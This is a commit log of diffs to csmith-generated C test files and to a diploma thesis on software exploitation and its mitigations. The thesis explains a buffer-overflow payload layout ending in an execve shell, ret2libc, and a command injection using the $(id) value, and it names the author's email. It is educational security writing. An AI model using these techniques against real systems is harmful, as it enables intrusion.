+   uint32_t  f0;
+   const volatile int16_t  f1;
+   const int32_t  f2;
+   signed f3 : 23;
+};
+
+union U3 {
+   uint16_t  f0;
+   uint32_t  f1;
+   volatile unsigned f2 : 31;
+   int64_t  f3;
+   uint32_t  f4;
+};
+
+union U4 {
+   uint16_t  f0;
+};
+
+/* --- GLOBAL VARIABLES --- */
+static uint64_t g_14 = 0x2A5BC42206DD2CC9LL;
+static int32_t g_19 = 0xB1AF9D66L;
+static int8_t g_25 = 0x9AL;
+static uint8_t g_26 = 0UL;
+static volatile union U3 g_68 = {0xB4D6L};/* VOLATILE GLOBAL g_68 */
+static int32_t g_88[8] = {6L,6L,6L,6L,6L,6L,6L,6L};
+static int32_t * volatile g_87 = &g_88[5];/* VOLATILE GLOBAL g_87 */
+static union U2 g_89 = {18446744073709551613UL};/* VOLATILE GLOBAL g_89 */
+static union U4 g_91 = {65535UL};
+static uint64_t *g_107 = &g_14;
+static volatile struct S0 g_115 = {0x4AAFL,0x677910A9L,0x996EF039L,0x36713F97C6D2ED0BLL,65533UL,0x9C6BD3C7L};/* VOLATILE GLOBAL g_115 */
[…]

### 2023-07-02 tcc_bench/testfiles/seed_50.c

@@ -1,0 +1,1799 @@
+/*
+ * This is a RANDOMLY GENERATED PROGRAM.
+ *
+ * Generator: csmith 2.4.0
+ * Git version: 92069e4
+ * Options:   -s 50 -o seed_50.c
+ * Seed:      50
+ */
+
+#include "csmith.h"
+
+
+static long __undefined;
+
+/* --- Struct/Union Declarations --- */
+/* --- GLOBAL VARIABLES --- */
+static volatile int32_t g_3 = 0x7D8A8701L;/* VOLATILE GLOBAL g_3 */
+static volatile int32_t g_4 = 0xE9D05BA7L;/* VOLATILE GLOBAL g_4 */
+static int32_t g_5[4] = {0x04B25B3BL,0x04B25B3BL,0x04B25B3BL,0x04B25B3BL};
+static volatile int32_t g_6 = 0x72A72759L;/* VOLATILE GLOBAL g_6 */
+static int32_t g_7 = 0xEA66E58DL;
+static int32_t g_31 = (-1L);
+static uint8_t g_50 = 0x02L;
+static int32_t g_77 = 0x8AC39FBDL;
+static int32_t g_101 = 0x92403636L;
+static uint64_t g_105[9] = {9UL,9UL,18446744073709551615UL,9UL,9UL,18446744073709551615UL,9UL,9UL,18446744073709551615UL};
+static int32_t *g_121 = (void*)0;
+static int32_t **g_120 = &g_121;
+static int8_t g_126 = 0x06L;
+static int32_t *g_129 = &g_77;
+static const volatile int8_t *g_143 = (void*)0;
+static const volatile int8_t * volatile *g_142 = &g_143;
+static int32_t g_150 = (-6L);
+static uint32_t g_162 = 0x0598F6BBL;
+static uint32_t g_178 = 0x80EF530DL;
+static int64_t g_216 = 0x32B38B3E490638F0LL;
+static uint16_t g_240[2] = {65535UL,65535UL};
+static uint32_t *g_306 = &g_178;
+static uint32_t * volatile *g_305[8][1] = {{&g_306},{&g_306},{&g_306},{&g_306},{&g_306},{&g_306},{&g_306},{&g_306}};
[…]

### 2023-07-02 paper.tex
final actually

@@
 \usepackage{xcolor}
-\usepackage[margin=2.54cm]{geometry}
 \usepackage[utf8]{inputenc}
+\usepackage{csquotes}
 \usepackage[english]{babel}
@@
 \usepackage[backend=biber,style=numeric]{biblatex}
+\nocite{*}
 
@@
 
+\makeatletter
+
+\newcommand{\advisor}[1]{\def\@advisor{#1}}
+\newcommand{\university}[1]{\def\@university{#1}}
+\newcommand{\universityRO}[1]{\def\@universityRO{#1}}
+\newcommand{\faculty}[1]{\def\@faculty{#1}}
+\newcommand{\facultyRO}[1]{\def\@facultyRO{#1}}
+\newcommand{\department}[1]{\def\@department{#1}}
+\newcommand{\departmentRO}[1]{\def\@departmentRO{#1}}
+\newcommand{\email}[1]{\def\@email{#1}}
+\newcommand{\location}[1]{\def\@location{#1}}
+\newcommand{\locationRO}[1]{\def\@locationRO{#1}}
+\newcommand{\titleRO}[1]{\def\@titleRO{#1}}
+
+\newcommand{\mi}[1]{\mathit{#1}}
+
+\renewcommand{\maketitle}{
+\begin{titlepage}
+    \begin{center}
+        {\LARGE \@university\\\@faculty\\\@department}
+
+        \vspace{3em}
+
+        \begin{tabular}{p{4cm}p{5.0cm}}
+            \includegraphics[scale = 0.12]{images/upb-logo.jpg} & \includegraphics[scale = 0.12]{images/cs-logo.png}
+        \end{tabular}
+
+        \vspace{4em}
+
+        {\Huge DIPLOMA PROJECT}
+
+        \vspace{3em}
+
+        {\Large \@title}
+
+        \vspace{2em}
+
+        {\Large \@author}
+
+        {\normalsize \@email}
+    \end{center}
+
+    \vspace{6em}
+
+    \begin{flushright}
+        {\large \textbf{Thesis advisor:}\vspace{1em}\\\@advisor}
+    \end{flushright}
+
+    \vspace{5em}
+
+    \begin{center}
+        {\Large \textbf{\@location}}
+
+        {\large \@date}
+    \end{center}
+    \newpage
+\end{titlepage}
+\begin{titlepage}
+    \begin{center}
+        {\LARGE \@universityRO\\\@facultyRO\\\@departmentRO}
+
+        \vspace{3em}
+
+        \begin{tabular}{p{4cm}p{5.0cm}}
+            \includegraphics[scale = 0.12]{images/upb-logo.jpg} & \includegraphics[scale = 0.12]{images/cs-logo.png}
+        \end{tabular}
+
+        \vspace{4em}
+
+        {\Huge PROIECT DE DIPLOMĂ}
+
+        \vspace{3em}
+
+        {\Large \@titleRO}
+
+        \vspace{2em}
+
+        {\Large \@author}
+
+        {\normalsize \@email}
+    \end{center}
+
+    \vspace{6em}
+
+    \begin{flushright}
+        {\large \textbf{Coordonator științific:}\vspace{1em}\\\@advisor}
+    \end{flushright}
+
+    \vspace{5em}
+
+    \begin{center}
+        {\Large \textbf{\@locationRO}}
+
+        {\large \@date}
+    \end{center}
+    \newpage
+\end{titlepage}
+}
+\makeatother
+
+\university{University Politehnica of Bucharest}
+\universityRO{Universitatea Politehnica din București}
+\faculty{Automatic Control and Computer Science}
+\facultyRO{Facultatea de Automatică și Calculatoare}
+\department{Computer Science and Engineering Department}
+\departmentRO{Departamentul de Calculatoare}
+\title{Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
+\titleRO{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern}
+\author{Bud Liviu-Alexandru}
+\email{budliviu@gmail.com}
+\advisor{As.Ing. Ştefan-Dan CIOCÎRLAN}
+\location{Bucharest}
+\locationRO{București}
+\date{2023}
+
 \begin{document}
 
-\title{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern / Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
 \maketitle
+% \title{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern / Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
+% \maketitle
 
@@
 
-Software exploitation continues to pose a significant threat to global cybersecurity, with vulnerabilities in software systems offering fertile ground for cyberattacks.
+\emph{Software exploitation} continues to pose a significant threat to global cybersecurity, with vulnerabilities in software systems offering fertile ground for cyberattacks.
 The expanding complexity of contemporary software and the incessantly evolving threat landscape only accentuates the magnitude of the problem.
-This paper will discuss the concept of software exploitation, elaborating on how attackers leverage vulnerabilities in software systems, illustrating some standard exploitation techniques, including buffer overflows, code injection, heap corruption, among others, while also exploring contemporary exploit detection and prevention methodologies, from static and dynamic analysis techniques to machine learning and artificial intelligence-based approaches, critically evaluating their strengths and weaknesses.
+This paper will discuss the concept of software exploitation, elaborating on how attackers leverage vulnerabilities in software systems, illustrating some standard exploitation techniques, including buffer overflows, code injection, heap corruption, among others, while also exploring contemporary exploit detection and prevention methodologies, critically evaluating their strengths and weaknesses.
 Finally showcasing the necessity for a proactive approach toward software security, outlining the importance of secure coding practices and threat modeling in the early stages of software development lifecycle.
@@
 \section{Motivation}%
-The ubiquity of digital devices in our daily lives has ushered in an era of unprecedented data accessibility and convenience.
-Yet, these conveniences also come with substantial security concerns.
-A significant proportion of the world's population carries a device in their pocket that is not only a communication device but also a gateway to their most personal and sensitive information, including bank accounts, biometrics, and other data of significant value.
-These devices, armed with cameras and microphones, could potentially be misused to impersonate their owners.
-With these threats looming, the importance of rigorous and effective exploit mitigation strategies, especially in system's programming, cannot be overstated.
-These mitigation strategies form the critical defensive layer that shields users from the consequences of potential security breaches, preventing unauthorized access, and securing the private sphere of individuals in the digital age.
-Hence, the motivation of this study is to evaluate, analyze, and enhance the robustness of these mitigation strategies, thereby contributing to safer and more secure software systems.
+Digital devices have made data access and ease unprecedented.
+However, these conveniences raise serious security issues.
+A large section of the world's population carries a device in their pocket that can access their bank accounts, fingerprints, and other valuable data.
+These devices may imitate their owners using cameras and microphones.
+Exploit mitigation measures, especially in system development, are crucial with these risks.
+These mitigation measures protect consumers from security breaches and secure their digital privacy.
+This study evaluates, analyzes, and improves various mitigation measures to make software systems safer and more secure.
 
@@
 Consequently, understanding the stack's functioning in x64 systems is crucial for building and securing software systems.
+The exploitation and proof of exploitability due to memory corruption have been formalized in~\cite{WeirdMachines}.
 
@@
 
-An example state of the stack during the call~\footnote{This example is used for simplicity.
+An example state of the stack during the call\footnote{This example is used for simplicity.
 In real world scenarios the variables would have been constant propagated and the function would have directly returned the result of the computation} to the function `example` Listing~\ref{lst:examplefn} is shown in Figure~\ref{fig:stackfame-example}.
 
-We can see that the stack frame contains some interesting values that we haven't defined ourselves:
+The stack frame contains some interesting values that were not declared in code:
 \begin{itemize}
@@
 
-Now that we understand how a stack frame looks, we can move on to how stack frames are linked together.
+Taking into account the layout of a stack frame, this is how stack frames are linked together when calling nested functions.
 Figure~\ref{fig:stacksample} shows the state of the stack while executing the following nested function call chain~\footnote{Assuming that foo does not return} (the `calls' operation is denoted by '$\Rightarrow$`):
@@
 The function the processor executes is at the head of the list, and the first function called by the program is situated at the tail.
-Because user variables are mixed with control structures, we can imagine the outcome if we managed to corrupt the \emph{forward} pointer in this linked list.
+Because user variables are mixed with control structures, corrupting the \emph{forward} pointer could lead to crashes or even exploits.
 
@@
 The algorithm behind the dynamic memory allocation API is left to be implementation-defined.
-We will dig deeper into the allocator used by LibC on the GNU/Linux operating system.
 
@@
 There are two main ways to allocate memory using this allocator.
-The allocator automatically chooses which technique to use based on the size of the requested allocation\footnote{We will be referring to allocations with a size $<$ {M\_MMAP\_THRESHOLD} as \emph{small} and to allocations larger than that as \emph{big}}\footnote{{M\_MMAP\_THRESHOLD} is set to 127k bytes by default}:
+The allocator automatically chooses which technique to use based on the size of the requested allocation\footnote{Allocations with a size $<$ {M\_MMAP\_THRESHOLD} aare\emph{small} and allocations larger than that are \emph{big}}\footnote{{M\_MMAP\_THRESHOLD} is set to 127k bytes by default}:
 \begin{itemize}
@@
 Large allocations bypass the allocation algorithm entirely (and will not be the focus of our exploitation scenarios), unlike small allocations, which pass through a pretty complex set of steps before the memory is given to us.
-We will discuss this algorithm in detail, highlighting areas of interest that will help us develop exploits and mitigations later.
-
-The allocation algorithm is described in depth in~\cite{MallocInternals}. We will mainly be exploring the \emph{tcache} part of the algorithm.
+This algorithm will be discussed in detail, highlighting areas of interest helpful for exploit and mitigation development.
+
+For futher reading, the allocation algorithm is described in depth in~\cite{MallocInternals}.
 
@@
 
-\texttt{tcache} intercepts the calls made to the \emph{free} function and stores these allocations in singly linked lists named tcache buckets.
+\texttt{tcache} intercepts the calls made to the \emph{free} function and stores these allocations in singly linked lists named ``tcache buckets''.
 Each bucket can store a range of allocation sizes.
@@
 \end{enumerate}
-Let's say we want to make an allocation that would fit inside $bucket_{0}$.
-The tcache algorithm would pull out that allocation from the list and return it to us, while updating the head of the list with the address of $alloc_{0}$.
+Assume that an allocation that would fit inside $bucket_{0}$ is made.
+The tcache algorithm would talke out that allocation from the list and return it to the program, while updating the head of the list with the address of $alloc_{0}$.
 
@@
   \end{tikzpicture}
-  \caption{\label{fig:tcache} Sample tcache state after malloc}%
+  \caption{\label{fig:tcache2} Sample tcache state after malloc}%
 \end{figure}
@@
 Early instances of software exploitation can be traced back to the late 1980s with the advent of the Morris Worm.
-Considered one of the first computer worms distributed via the Internet, the Morris Worm infected approximately 6,000 computers, causing significant slowdowns or rendering them unusable \cite{spafford1989internet}.
-Since then, various software vulnerabilities have been exploited, including buffer overflows, injection attacks, and privilege escalation, leading to massive data breaches, service disruptions, and significant financial losses \cite{owasp2017}.
+Considered one of the first computer worms distributed via the Internet, the Morris Worm infected approximately 6,000 computers, causing significant slowdowns or rendering them unusable.
+Since then, various software vulnerabilities have been exploited, including buffer overflows, injection attacks, and privilege escalation, leading to massive data breaches, service disruptions, and significant financial losses .
 The history of software exploitation elucidates the perpetual arms race between attackers seeking to exploit vulnerabilities and defenders striving to secure systems.
@@
 A Buffer overflow represents a crucial class of software vulnerabilities that can serve as a launching pad for a myriad of complex exploits, one of which includes shellcode injection.
-This vulnerability arises when more data is written to a buffer than it can hold, allowing an attacker to overwrite adjacent memory locations \cite{seacord2013}.
+This vulnerability arises when more data is written to a buffer than it can hold, allowing an attacker to overwrite adjacent memory locations.
 If exploited judiciously, this can alter the program's control flow, enabling an attacker to execute arbitrary code.
-One manifestation of this is shellcoding, where an attacker injects a sequence of bytes, often encoding command-line shell instructions, into the memory and manipulates the program's execution flow to execute this code \cite{one1996smashing}.
+One manifestation of this is shellcoding, where an attacker injects a sequence of bytes, often encoding command-line shell instructions, into the memory and manipulates the program's execution flow to execute this code \cite{alephone}.
 This capability to execute arbitrary code gives the attacker complete control over the compromised system, illustrating the severity and implications of buffer overflow vulnerabilities.
 
-Below \ref{lst:bof} is an example of a vulnerable program.
+Code for the vulnerable program used is available at Annex~\ref{lst:bof-sample}.
 
@@
 
-But running the program with the following malicious crafted input we get a vastly different result\footnote{This would not happen in modern compilers because of mitigations enabled by default.
+But running the program with the following malicious crafted input a vastly different result\footnote{This would not happen in modern compilers because of mitigations enabled is displayed.
 The exact compilation flags required for this attack were: \texttt{-fno-stack-protector -z execstack -fno-pic -no-pie}}:
@@
 \end{lstlisting}
-Our simple program behaves like a system shell.
-We will now analyze what happened during the execution of our program.
-Here,~\ref {lst:bof_malicous_hex} is a hex dump of the input.
-Let us break it down:
+The program behaves like a system shell. Listing ~\ref{lst:bof_malicous_hex} shows the payload used in \emph{hexdump} form. 
 \begin{enumerate}
-  \item The first 0x100 bytes of the payload are just null bytes\footnote{We are allowed to do this because \emph{gets} does not stop reading the string when it encounters a \emph{NULL} (0) byte, even though strings in C are almost always NULL terminated.~\emph{scanf} will only return when it encounters an error or reads a line ending}.
-We do this in order to fill up the buffer that the application uses.
-These values could be anything (besides line endings).
-  \item As shown in\ref{veziacistackuala} we now need to overflow the \emph{base pointer}.
-This exploitation scenario allows us to place any value instead of the saved rbp (because it is not used), but it can allow us to pivot the stack into some memory address we know in some cases.
-  \item Now we overwrite the \emph{return address} to point to the address of the \emph{jump rsp} instruction.
-  \item After the return address, we place a \emph{nop sled}.
-The purpose of the nop sled is to allow us some leeway\footnote{When jumping into shellcode written to the stack, the addresses the stack register and instruction pointer point to are close together.
-Stack manipulations (such as \emph{push}es and \emph{pop}s) can overwrite the shellcode, causing it to misbehave or making the processor execute illegal instructions.} when crafting the actual malicious payload.
-  \item Finally, we place the instructions we want to execute.
-The payload exemplified\ref{vezipayload} here uses the \emph{execve} syscall to replace the current running process with the \emph{sh} shell process.
+  \item \texttt{0000000-0000100} null bytes\footnote{\emph{gets} does not stop reading the string when it encounters a \emph{NULL} (0) byte, even though C strings NULL terminated.~\emph{scanf} will stop consuming input only when it encounters an error or a line break}.
+  \item \texttt{0000100-0000108} overflowed \emph{base pointer} This exact exploitation scenario does not impose any restrictions on the overflowed value of the base pointer.
+  \item \texttt{0000108-0000110} overflowed \emph{return address}, now containing the address of the \emph{jump rsp} gadget
+  \item \texttt{0000110-0000310} \emph{nop sled}, giving the attacker leeway when choosing the return address.
+  \item \texttt{0000110-0000310} shellcode at Listing ~\ref{lst:bofshell} calling the \emph{execve} function with the arguments: ``/bin/sh"", NULL, NULL, granting the attacker a shell on the system
 \end{enumerate}
 
-This traditional exploitation technique of buffer overflow into shellcode has been effectively mitigated by a plethora of defensive mechanisms that we will discuss in subsequent chapters, such as Address Space Layout Randomization (ASLR), Data Execution Prevention (DEP), Stack Canaries, Control-Flow Integrity (CFI).
-Despite these advancements, the described exploitation scenarios retain relevance in contexts where these protection measures are absent or cannot be implemented.
-For example, systems lacking a Memory Management Unit (MMU), many embedded systems, and specific router configurations may not have these defenses, leaving them susceptible to such attacks.
-Thus, understanding these exploits remains critical in a comprehensive approach to system security.
+This traditional exploitation technique of buffer overflow to shellcode has been effectively mitigated by a multitude of defensive mechanisms, which will be discussed in subsequent chapters.
+These mechanisms include \emph{Address Space Layout Randomization} (ASLR), \emph{Data Execution Prevention} (DEP), \emph{Stack Canaries}, and \emph{Control-Flow Integrity} (CFI).
+Despite these developments, the exploitative scenarios that were outlined are still applicable in settings in which the protective mechanisms stated above are either not present or cannot be adopted.
+For example, systems that do not have a \emph{Memory Management Unit} (MMU), a large number of embedded systems, and some router configurations may lack these safeguards, leaving them susceptible to assaults of this kind.
+It is still essential for a complete system security plan to have a solid understanding of these attacks.
 
@@
   \end{tikzpicture}
-  \caption{\label{fig:label} State of the stack before executing \emph{gets} in the function \emph{say\_hi}}%
-  \label{fig:stackframe}
+  \caption{\label{fig:stackframe} State of the stack before executing \emph{gets} in the function \emph{say\_hi}}%
 \end{figure}
@@
 \begin{lstlisting}[caption={Shellcode disassembly}
-      ,label={lst:bof}
+      ,label={lst:bofshell}
       ,language={[x86masm]Assembler}]
@@
 \subsubsection{Command injection}
-Command injection vulnerabilities represent a pervasive class of security issues impacting web and system programming environments.
-These vulnerabilities occur when an application passes unsafe user-supplied data (forms, cookies, HTTP headers) to a system shell, allowing the attacker to execute arbitrary commands on the host operating system.
-In web applications, these flaws are primarily found in scripts that fail to properly sanitize user input, making them susceptible to cross-site scripting (XSS) and SQL injection attacks.
-However, command injection vulnerabilities are not confined to web programming; they are equally prevalent in systems programming.
-Poorly designed system applications and scripts that accept untrusted input for command execution can expose the system to similar attacks.
-This vulnerability, thus, underlines the importance of careful data handling and proper input validation, irrespective of the programming environment.
-
-We will be walking through the following\ref{veziphpbapula} vulnerable PHP app.
-The application lacks proper input validation and allows an attacker to execute arbitrary commands.
-The use of the \emph{system} function will cause the following process to execute \texttt{sh -c ``echo Hello <username>''}\footnote{There are situations where we are not able to inject parameters into a command that will be directly reflected in the page.
-In these situations, we can try to end the intended command by using a \emph{;} character and then write our malicious command after.}.
-Our\ref{poggeroni} malicious request sets the \emph{username} parameter to \verb|$(id)|.
-Because the original command executes in a shell environment, the shell will interpret this string by forking itself, executing the string between the braces, and replacing the original string with the result of the command.
-We can imagine that we can cause havoc on the vulnerable machine by being able to execute any command we want.
+Command injection vulnerabilities are pervasive in web and system programming environments.
+These flaws occur when an application passes unsecure user-supplied data (forms, cookies, HTTP headers) to a system shell, allowing an attacker to execute arbitrary commands on the host operating system.
+
+\emph{Cross-site scripting} (XSS) and \emph{SQL injection} vulnerabilities are most prevalent in web applications with scripts that fail to properly sanitize user input, making them susceptible to such attacks.
+However, command injection vulnerabilities are prevalent in systems programming as well as web programming.
+Applications and programs that accept untrusted input for command execution and are poorly designed can expose the system to similar attacks.
+This vulnerability highlights the significance of careful data management and input validation regardless of the programming environment.
+
+Such an example of a vulnerable app is shown in Listing~\ref{lst:phpinject}.
+The application lacks proper input validation and allows an attacker to execute arbitrary commands due to use of the \emph{system} function.
+The malicious request at Listing~\ref{lst:cmdinj} sets the \emph{username} parameter to \verb|$(id)|, causing the system shell called by the \emph{system} PHP function to interpret the username as a subcommand, interpolating the output into the original command.
 
@@
 \begin{lstlisting}[caption={Command Injection example}
-      ,label={lst:bof}
+      ,label={lst:phpinject}
       ,language=PHP]
@@
 \begin{lstlisting}[caption={Command Injection example}
-      ,label={lst:bof}
+      ,label={lst:cmdinj}
       ,language=bash]
@@
 The situation is similar in the systems programming space. The example of how a vulnerable program might look is left as an exercise for the reader.
+
 \subsection{Evolution}
-\begin{comment} ret2libc
-  Mention the lack of mitigation
-  Rise of heap based exploits due to browsers and JS
-  Research some linux&windows kernel exploits
-\end{comment}
 As mitigation strategies have advanced in both hardware and software to counteract software exploitation, so too have the techniques used by threat actors, resulting in a continual escalation of sophistication.
 In response to hardening mechanisms such as stack canaries and NX bits, novel exploitation techniques have been developed to circumvent these defenses.
-Return Oriented Programming (ROP) and heap corruption exploits are prominent among these.
-ROP is a technique that leverages existing code fragments, known as "gadgets", in the binary to perform arbitrary computations, effectively sidestepping the constraints enforced by the NX bit.
+\emph{Return Oriented Programming} (ROP) and heap corruption exploits are prominent among these.
+ROP is a technique that leverages existing code fragments, known as "gadgets", in the binary to perform arbitrary computations, effectively sidestepping the constraints enforced by the \emph{NX} bit.
+
 On the other hand, heap corruption exploits involve manipulating the metadata of memory management structures to induce undefined behavior, providing the means to execute arbitrary code or escalate privileges.
@@
 The entry mechanism behind this technique is the same as in the code injection case.
-We overwrite the return address of the program with an address we control.
-However, this time instead of providing our shellcode, we use existing code mapped inside the address space of the vulnerable process (usually from within the binary itself or LibC\footnote{LibC is mapped in almost all processes running on a system}).
-
-For example, we could overwrite the return address of a function with the address of the \emph{system} function. When implementing this kind of attack, we face two difficult problems:
+The return address is overwritten with an attacker controlled address.
+However, this time instead of providing our shellcode, use existing code is made that is mapped inside the address space of the vulnerable process, in this case from LibC itself.
+
+For example, The return address of a function can be overwritten with the address of the \emph{system} function.
+
+Executing a ret2libc attack imposes two main challenges on the attacker:
 \begin{enumerate}
-  \item What is the address of the function we want to call?
-  \item How can we control the parameters that we pass to the function?
+  \item at what address are important functions such as \emph{system} located?
+  \item what mechanisms does the binary provide to pass parameters to functions that it did not call originally?
 \end{enumerate}
@@
 
-We will assume we have identified an exploitable buffer overflow and a way to leak a known arbitrary address within LibC.
-Now we want to call the \emph{system} function with the `sh' string to grant us a foothold on the machine.
-In Figure~\ref{fig:vmmap} is an example of how the virtual memory space looks when executing a binary.
-The \emph{system} function is located in the text section\footnote{Briefly explain sections} of LibC.
-If LibC is compiled with PIC and ASLR is enabled on the target system, sections will be offset relative to a randomly selected base address.
-Using the information disclosure vulnerability to leak an address\footnote{Libc meme}, we can compute the base address of the library and, from there, get addresses for any byte in the library.
-
-Assuming managed to leak the address of the \emph{printf} function and have the exact LibC binary running on the system. We can get the base address at which the library is mapped using this formula:
+The following exploitation steps assume that a function vulnerable to a buffer overflow is available and a known address from within LibC is known.
+The next step of this exploit is to call the \emph{system} function with `/bin/sh' as it's argument to grant us a foothold on the machine.
+In Figure~\ref{fig:vmmap} is an example of how the virtual memory space is laid out when executing a binary.
+The \emph{system} function is located within the text section of LibC.
+If LibC is compiled with \emph{PIC} and \emph{ASLR} is enabled on the target system, sections will be offset relative to a randomly selected base address.
+Using the known address it is possible to compute the base address of the library and, from there, get addresses for any byte in the library.
+
+The equation below shows how the base of LibC can be computed using any known address and the LibC binary (exemplified with the \emph{printf} function):
 \begin{equation}
@@
 
-Now that we have the first issue fixed, how do we pass parameters to the functions we want to call?
-Because the NX (No-Execute) bit is enabled, and all executable regions of code are read-only to prevent shellcode, we will chain together multiple addresses that point to small code chunks ending in the \emph{ret} instruction.
-
-An example \emph{ret2libc} attack on a modified version of the code at \ref{lst:bof-sample} that leaks the address of \emph{puts} to stdout and is compiled with all NX enabled\footnote{The stack canary was still disabled for this example.
-The exact compiler flags were} is shown in Appendix~\ref{lst:pwntools}
+Moving to the second challenge, how can parameters be passed to the function overflowed into the return address?
+It is not possible to provide instructions directly, as they are placed on the Stack, a region of memory that cannot be executed (due to NX), but using snippets of code already present in the binary allows for manipulating registers and memory addresses in such a way as to mimic the program calling the function as intended.
+
+An example \emph{ret2libc} attack on a modified version of the code at Listing~\ref{lst:bof-sample} compiled with NX enabled and stack protectors disabled, that leaks the address of \emph{puts} to stdout, is shown in Appendix~\ref{lst:pwntools}
 
 \subsection{Exploit chains}
-\begin{figure}[ht]
+\begin{figure}[H]
   \centering
@@
 
-The mitigation strategies employed by hardware and software designers have limited the impact we have when executing a single exploit.
+The mitigation strategies employed by hardware and software designers have limited the impact a single exploit can have.
 This has given rise to \emph{exploit chains}.
@@
 Figure~\ref{pic:process} describes how an attacker would approach exploiting a system.
-
-If we do not possess the required information to execute our exploit, we can use another one (another link in the exploit chain) to gather more and more.
-The exploitation and proof of exploitability process have been formalized in~\cite{WeirdMachines}.
 
@@
 
-We will continue by looking at the structure of how Javascript values (or JSValues) are encoded into memory:
-
+Below is the structure of how Javascript values (or JSValues) are encoded into memory:
 \begin{figure}[H]%
@@
   \end{tikzpicture}
-  \caption{\label{fig:label} Virtual memory map}%
-  \label{fig:stackframe}
+  \caption{\label{fig:memorymap} Virtual memory map}%
 \end{figure}
@@
 Even before the findings mentioned earlier, researchers have been able to cross the virtualization boundary and gain information from other VMs running on the same machine.
-The \cite{flushreload} reveals an attack that can recover around \~95\% of the bits of a GnuPG secret key.
+The \cite{flushreload} reveals an attack that can recover around 95\% of the bits of a GnuPG secret key.
 
@@
 \subsubsection{Stack canaries}
-Defending against stack buffer overflows has been attempted since 1997 with StackGuard\cite{stackguard}, but it was not until 2006, with the release of GCC 4.1 this was available for the entire Linux community.
+Defending against stack buffer overflows has been attempted since 1997 with StackGuard ~\cite{stackguard}, but it was not until 2006, with the release of GCC 4.1 this was available for the entire Linux community.
 This mitigation places a random sacrificial value right before the return address in modern compilers.
@@
 With the increasing amount of memory errors in unsafe system programming languages such as C and C++, methods for detecting runtime errors without requiring code changes have been developed.
-Even though they are rarely used in production environments, they have seen massive success when used in conjunction with fuzzers \ref{vezi niste paperuri de fuzzere} to detect severe vulnerabilities in large code bases.
+Even though they are rarely used in production environments, they have seen massive success when used in conjunction with fuzzers~\cite{fuzz1}~\cite{fuzz2} to detect severe vulnerabilities in large code bases.
 
@@
 
-Listing \ref{lst:safestack} showcases dissasembly of the program at Annex \ref{lst:bof-sample} compiled with SafeStack.
+Listing~\ref{lst:safestack} showcases dissasembly of the program at Annex~\ref{lst:bof-sample} compiled with SafeStack.
 The buffer passed to \emph{gets} is not relative to \emph{RSP}.
@@
 
-Running our \emph{ret2libc} exploit on this binary, the behaviour is the same as if we had a much larger buffer:
+Running our \emph{ret2libc} exploit on this binary, it behaves as if the overflow never happened. 
 \begin{lstlisting}[
@@
 
-Listing \ref{lst:unsafestack} showcases the stack we are familiar with. An address that is close to the return address is passed to \emph{gets}.
+Listing~\ref{lst:unsafestack} showcases the disassembly of the call without SafeStack. An address that is close to the return address is passed to \emph{gets}.
 
@@
 This functionality is prominent in projects where the host system's security is paramount, such as Docker, Chrome, or Firefox.
-Here\ref{codubun} is an example of the granular control seccomp can achieve.
+Listing~\ref{lst:seccomp} is an example of the granular control seccomp can achieve.
 Note that once a process installs a seccomp filter, it is impossible to remove it without exploiting the kernel while also being inherited by all child processes of the filtered process.
@@
 
-This happens because the shellcode we use contains the syscall \emph{execve}, which we used for gaining a shell, but this syscall is not allowed.
-Without a vulnerable kernel driver it is almost impossible to bypass this filters if they are strict enough, but there is always a risk that a program needs syscalls that could compromise the system, or the filters were not properly audited and are too permissive.
+This happens because the provided shellcode use contains the syscall \emph{execve}, which is used for gaining a shell on the system, but this syscall is not allowed by the seccomp filters.
+Without a vulnerable kernel driver it is impossible to bypass these filters if they are correct, but there is always a risk that a program needs syscalls that could compromise the system, or filters that were not properly audited and are too permissive.
 
@@
 The benchmark consists of compiling the \emph{speedbench.c} file, generated with \emph{csmith} 2.4.0 using the following commandline arguments ``--seed 328954452 --max-funcs 90''.
-\emph{cmisth}\cite{csmith} is a tool that generates C code and was successfully used to find bugs in mainstream compilers.
-
+\emph{cmisth}~\cite{csmith} is a tool that generates C code and was successfully used to find bugs in mainstream compilers.
+
+\subsubsection{Results}
 \begin{table}[H]
@@
 
-As expected, the more mitigations and sanitizers are added, the slower the execution time becomes.
+As expected, the more mitigations and sanitizers are added, the slower the execution time becomes, highlighting the importance of secure coding practices.
+Even though the performance losses seem massive (~4x slower execution time in the \emph{Hardened}), the baseline performance needs to be considered.
+C is one of the fastest languages when it comes to execution time, giving us some leeway to use these protections.
+
+\emph{Clang} seems to be at the forefront of sanitization passes as its support is more complete and it has more choices.
+A fully hardened binary that protects against almost all known memory corruption while only being ~4x slower than baseline.
+This level of protection rivals the one offered by interpreted languages such as \emph{Python} or \emph{JavaScript}.
+
+Another fact that needs to be considered is that with more and more mitigations diminishing returns start to kick in.
+Some essential mitigations(Stack Protector and SafeStack) have a small impact on runtime performance while thwarting many exploitation techniques.
+
+For production environments, the minimal runtime is available, which gains around a \emph{50\%} performance uplift when compared to the standard runtime, bringing the performance closer to the unsanitized version.
+
+The use of sanitizers has proven itself even in environments where performance is paramount, such as the Linux Kernel, and due to rising interest in memory protection, hardware solutions such as \emph{Hardware Tag-Based KASAN} are actively being used in production with a low memory and processing overhead.
+
+Another useful feature of most sanitizers is their detailed report about the erorrs they encountered. This is an example of such report taken from \cite{KernelUbsan}:
+
+\begin{lstlisting}[caption={Kernel UBSAN Report}
+      ,label={lst:ubsan_report}
+      ,language=bash]
+===========================================================
+UBSAN: Undefined behaviour in ../include/linux/bitops.h:110:33
+shift exponent 32 is to large for 32-bit type 'unsigned int'
+CPU: 0 PID: 0 Comm: swapper Not tainted 4.4.0-rc1+ #26
+ 0000000000000000 ffffffff82403cc8 ffffffff815e6cd6 0000000000000001
+ ffffffff82403cf8 ffffffff82403ce0 ffffffff8163a5ed 0000000000000020
+ ffffffff82403d78 ffffffff8163ac2b ffffffff815f0001 0000000000000002
+Call Trace:
+ [<ffffffff815e6cd6>] dump_stack+0x45/0x5f
+ [<ffffffff8163a5ed>] ubsan_epilogue+0xd/0x40
